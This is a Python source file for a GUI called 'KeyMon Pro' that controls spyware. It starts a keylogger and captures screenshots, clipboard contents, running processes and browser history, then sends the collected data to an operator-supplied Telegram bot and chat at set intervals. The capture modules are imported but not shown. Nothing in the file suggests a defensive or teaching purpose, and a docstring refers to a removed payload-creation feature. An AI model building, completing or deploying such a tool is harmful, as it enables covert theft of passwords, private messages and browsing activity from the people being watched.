import customtkinter as ctk
import json
import os
import sys
from PIL import Image
import threading
from typing import Dict, Any
import asyncio
import time
import telegram
import logging

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('keymon.log'),
        logging.StreamHandler()
    ]
)

# Disable verbose logging from other libraries
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('httpcore').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# Get the project root directory
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

# Import monitoring modules
try:
    from src.keylogger import Keylogger
    from src.screenshot import ScreenshotCapture
    from src.clipboard_monitor import ClipboardMonitor
    from src.process_monitor import ProcessMonitor
    from src.browser_monitor import BrowserMonitor
    from src.telegram_reporter import TelegramReporter
    from src.central_logger import central_logger
except Exception as e:
    logger.error(f"Error importing modules: {e}")
    raise

class MonitoringGUI:
    def __init__(self):
        self.config_file = os.path.join(project_root, "config.json")
        self.monitoring_active = False
        self.stop_event = threading.Event()
        
        # Initialize main window
        self.window = ctk.CTk()
        self.window.title("KeyMon Pro")
        self.window.geometry("800x600")
        
        # Set theme
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        
        self.monitor_threads = []
        self.telegram_thread = None
        
        self.create_gui()
        self.load_config()

    def create_gui(self):
        # Create main container
        self.main_container = ctk.CTkFrame(self.window)
        self.main_container.pack(fill="both", expand=True, padx=20, pady=20)

        # Telegram Configuration Section
        self.create_telegram_section()
        
        # Monitoring Options Section
        self.create_monitoring_section()
        
        # Intervals Section
        self.create_intervals_section()
        
        # Control Buttons
        self.create_control_buttons()
        
        # Status Bar
        self.create_status_bar()

    def create_telegram_section(self):
        telegram_frame = ctk.CTkFrame(self.main_container)
        telegram_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(telegram_frame, text="Telegram Configuration", 
                    font=("Arial", 16, "bold")).pack(pady=5)
        
        # Bot Token
        token_frame = ctk.CTkFrame(telegram_frame)
        token_frame.pack(fill="x", padx=5, pady=2)
        ctk.CTkLabel(token_frame, text="Bot Token:").pack(side="left", padx=5)
        self.token_entry = ctk.CTkEntry(token_frame, width=400)
        self.token_entry.pack(side="left", padx=5, fill="x", expand=True)
        
        # Chat ID
        chat_frame = ctk.CTkFrame(telegram_frame)
        chat_frame.pack(fill="x", padx=5, pady=2)
        ctk.CTkLabel(chat_frame, text="Chat ID:  ").pack(side="left", padx=5)
        self.chat_id_entry = ctk.CTkEntry(chat_frame, width=400)
        self.chat_id_entry.pack(side="left", padx=5, fill="x", expand=True)

    def create_monitoring_section(self):
        monitor_frame = ctk.CTkFrame(self.main_container)
        monitor_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(monitor_frame, text="Monitoring Features", 
                    font=("Arial", 16, "bold")).pack(pady=5)
        
        # Checkboxes for features
        self.features = {
            "keypress": "Keyboard Activity",
            "screenshot": "Screenshots",
            "clipboard": "Clipboard",
            "process": "Process Monitor",
            "active_window": "Active Windows",
            "browser_history": "Browser History"
        }
        
        self.feature_vars = {}
        for key, label in self.features.items():
            var = ctk.BooleanVar(value=True)
            var.trace_add("write", lambda *args, k=key: self.on_feature_change(k))
            self.feature_vars[key] = var
            ctk.CTkCheckBox(monitor_frame, text=label, variable=var).pack(pady=2)

    def on_feature_change(self, feature_key):
        """Called when a feature checkbox changes"""
        try:
            # Auto-save configuration when features change
            self.save_config()
            self.update_status(f"Updated {feature_key} setting", "green")
        except Exception as e:
            self.update_status(f"Error updating feature: {str(e)}", "red")

    def create_intervals_section(self):
        intervals_frame = ctk.CTkFrame(self.main_container)
        intervals_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(intervals_frame, text="Intervals (seconds)", 
                    font=("Arial", 16, "bold")).pack(pady=5)
        
        # Screenshot interval
        screenshot_frame = ctk.CTkFrame(intervals_frame)
        screenshot_frame.pack(fill="x", padx=5, pady=2)
        ctk.CTkLabel(screenshot_frame, text="Screenshot:").pack(side="left", padx=5)
        self.screenshot_interval = ctk.CTkEntry(screenshot_frame, width=100)
        self.screenshot_interval.insert(0, "30")
        self.screenshot_interval.pack(side="left", padx=5)
        
        # Report interval
        report_frame = ctk.CTkFrame(intervals_frame)
        report_frame.pack(fill="x", padx=5, pady=2)
        ctk.CTkLabel(report_frame, text="Report:      ").pack(side="left", padx=5)
        self.report_interval = ctk.CTkEntry(report_frame, width=100)
        self.report_interval.insert(0, "300")
        self.report_interval.pack(side="left", padx=5)

    def create_control_buttons(self):
        """Create control buttons without payload creation"""
        button_frame = ctk.CTkFrame(self.main_container)
        button_frame.pack(fill="x", padx=10, pady=5)
        
        # Left side - Save Config button
        left_buttons = ctk.CTkFrame(button_frame)
        left_buttons.pack(side="left", padx=5)
        
        self.save_button = ctk.CTkButton(
            left_buttons, 
            text="Save Config", 
            command=self.save_config
        )
        self.save_button.pack(side="left", padx=5, pady=10)
        
        # Right side - Start/Stop button
        self.start_stop_button = ctk.CTkButton(
            button_frame, 
            text="Start Monitoring", 
            command=self.toggle_monitoring
        )
        self.start_stop_button.pack(side="right", padx=5, pady=10)

    def create_status_bar(self):
        self.status_label = ctk.CTkLabel(
            self.main_container, 
            text="Ready", 
            font=("Arial", 12)
        )
        self.status_label.pack(pady=5)

    def save_config(self):
        config = {
            "telegram": {
                "token": self.token_entry.get(),
                "chat_id": self.chat_id_entry.get()
            },
            "features": {k: v.get() for k, v in self.feature_vars.items()},
            "intervals": {
                "screenshot": int(self.screenshot_interval.get()),
                "report": int(self.report_interval.get())
            }
        }
        
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=4)
            self.update_status("Configuration saved successfully!", "green")
        except Exception as e:
            self.update_status(f"Error saving configuration: {str(e)}", "red")

    def load_config(self):
        if not os.path.exists(self.config_file):
            return
        
        try:
            with open(self.config_file, 'r') as f:
                config = json.load(f)
            
            # Load Telegram settings
            self.token_entry.delete(0, 'end')
            self.token_entry.insert(0, config["telegram"]["token"])
            self.chat_id_entry.delete(0, 'end')
            self.chat_id_entry.insert(0, config["telegram"]["chat_id"])
            
            # Load feature settings
            for key, value in config["features"].items():
                if key in self.feature_vars:
                    self.feature_vars[key].set(value)
            
            # Load intervals
            self.screenshot_interval.delete(0, 'end')
            self.screenshot_interval.insert(0, str(config["intervals"]["screenshot"]))
            self.report_interval.delete(0, 'end')
            self.report_interval.insert(0, str(config["intervals"]["report"]))
            
            self.update_status("Configuration loaded successfully!", "green")
        except Exception as e:
            self.update_status(f"Error loading configuration: {str(e)}", "red")

    def update_status(self, message: str, color: str = "white"):
        self.status_label.configure(text=message, text_color=color)

    def validate_telegram_credentials(self):
        """Validate Telegram token and chat ID"""
        token = self.token_entry.get().strip()
        chat_id = self.chat_id_entry.get().strip()
        
        if not token:
            self.update_status("Error: Telegram Bot Token is required", "red")
            return False
        
        if not chat_id:
            self.update_status("Error: Telegram Chat ID is required", "red")
            return False
        
        return True

    def toggle_monitoring(self):
        if not self.monitoring_active:
            # Validate credentials before starting
            if not self.validate_telegram_credentials():
                return
            
            # Rest of the existing start monitoring code...
            self.stop_event.clear()
            self.monitoring_active = True
            self.start_stop_button.configure(text="Stop Monitoring")
            
            # Create and start monitoring thread
            self.monitor_thread = threading.Thread(target=self.start_monitoring)
            self.monitor_thread.daemon = True
            self.monitor_thread.start()
            
            self.update_status("Monitoring started", "green")
        else:
            # Create a non-blocking stop thread
            stop_thread = threading.Thread(target=self.stop_monitoring)
            stop_thread.daemon = True
            stop_thread.start()
            
            # Update UI immediately
            self.start_stop_button.configure(text="Stopping...", state="disabled")
            self.update_status("Stopping monitoring...", "yellow")

    def stop_monitoring(self):
        """Handle stopping monitoring in a separate thread"""
        try:
            logger.info("Stopping monitoring services...")
            # Set stop event first
            self.stop_event.set()
            
            # Stop telegram reporter first
            if hasattr(self, 'reporter') and self.reporter:
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(self.reporter.stop())
                    loop.close()
                except Exception as e:
                    print(f"Error stopping telegram reporter: {e}")
            
            # Stop all monitoring threads
            if hasattr(self, 'monitor_threads'):
                for thread in self.monitor_threads:
                    if thread and thread.is_alive():
                        thread.join(timeout=2)
            
            # Stop telegram thread last
            if self.telegram_thread and self.telegram_thread.is_alive():
                self.telegram_thread.join(timeout=2)
            
            # Clear references
            self.monitor_threads = []
            self.telegram_thread = None
            self.reporter = None
            
            # Update UI in thread-safe way
            self.window.after(0, self.finish_stopping)
            
        except Exception as e:
            logger.error(f"Error in stop_monitoring: {e}", exc_info=True)
            self.window.after(0, lambda: self.update_status(f"Error stopping monitoring: {str(e)}", "red"))

    def finish_stopping(self):
        """Complete the stopping process and update UI"""
        self.monitoring_active = False
        self.start_stop_button.configure(text="Start Monitoring", state="normal")
        self.update_status("Monitoring stopped", "yellow")

    def start_monitoring(self):
        try:
            logger.info("Starting monitoring services...")
            
            # Clear previous thread lists
            self.monitor_threads = []
            self.telegram_thread = None
            self.stop_event.clear()
            
            logger.info("Updating central logger credentials...")
            central_logger.update_telegram_credentials(
                self.token_entry.get().strip(),
                self.chat_id_entry.get().strip()
            )
            
            try:
                logger.info("Initializing Telegram reporter...")
                # Create new event loop for telegram reporter
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                self.reporter = TelegramReporter(
                    self.token_entry.get().strip(),
                    self.chat_id_entry.get().strip(),
                    report_interval=int(self.report_interval.get())
                )
                
                # Start telegram reporter in its own thread with proper loop handling
                def run_telegram():
                    try:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(self.reporter.start())
                    except Exception as e:
                        print(f"Telegram thread error: {e}")
                    finally:
                        loop.close()
                
                self.telegram_thread = threading.Thread(target=run_telegram)
                self.telegram_thread.daemon = True
                self.telegram_thread.start()
                
                # Start monitoring services
                if self.feature_vars["keypress"].get():
                    logger.info("Starting keylogger...")
                    from src.keylogger import Keylogger
                    keylogger = Keylogger(stop_event=self.stop_event)
                    keylogger_thread = threading.Thread(target=keylogger.start)
                    keylogger_thread.daemon = True
                    keylogger_thread.start()
                    self.monitor_threads.append(keylogger_thread)
                    
                if self.feature_vars["screenshot"].get():
                    logger.info("Starting screenshots...")
                    from src.screenshot import ScreenshotCapture
                    screenshot = ScreenshotCapture(
                        interval=int(self.screenshot_interval.get()),
                        stop_event=self.stop_event
                    )
                    screenshot_thread = threading.Thread(target=screenshot.start)
                    screenshot_thread.daemon = True
                    screenshot_thread.start()
                    self.monitor_threads.append(screenshot_thread)
                    
                if self.feature_vars["clipboard"].get():
                    logger.info("Starting clipboard monitor...")
                    from src.clipboard_monitor import ClipboardMonitor
                    clipboard = ClipboardMonitor(stop_event=self.stop_event)
                    clipboard_thread = threading.Thread(target=clipboard.start)
                    clipboard_thread.daemon = True
                    clipboard_thread.start()
                    self.monitor_threads.append(clipboard_thread)
                    
                if self.feature_vars["process"].get():
                    logger.info("Starting process monitor...")
                    from src.process_monitor import ProcessMonitor
                    process = ProcessMonitor(stop_event=self.stop_event)
                    process_thread = threading.Thread(target=process.start)
                    process_thread.daemon = True
                    process_thread.start()
                    self.monitor_threads.append(process_thread)
                    
                if self.feature_vars["browser_history"].get():
                    logger.info("Starting browser history monitor...")
                    from src.browser_monitor import BrowserMonitor
                    browser = BrowserMonitor(stop_event=self.stop_event)
                    browser_thread = threading.Thread(target=browser.start)
                    browser_thread.daemon = True
                    browser_thread.start()
                    self.monitor_threads.append(browser_thread)
                    
            except Exception as e:
                logger.error(f"Error initializing services: {e}", exc_info=True)
                raise
            
            logger.info("All monitoring services started successfully")
            self.update_status("All monitoring services started", "green")
            
        except Exception as e:
            logger.error(f"Error in start_monitoring: {e}", exc_info=True)
            self.update_status(f"Error in monitoring: {str(e)}", "red")
            self.monitoring_active = False
            self.start_stop_button.configure(text="Start Monitoring")

    def run(self):
        self.window.mainloop()

if __name__ == "__main__":
    app = MonitoringGUI()
    app.run() 